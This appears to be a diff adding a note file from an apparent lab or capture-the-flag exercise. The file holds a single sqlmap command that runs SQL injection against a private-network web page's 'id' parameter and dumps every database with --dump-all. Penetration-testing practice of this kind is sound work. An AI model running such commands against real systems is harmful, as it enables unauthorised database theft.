@@ -1,0 +1,5 @@
+sqlmap -u "http://10.11.200.137/index.php?page=searchimg&id=2-1&Submit=Submit" --dump-all
+
+
+
+
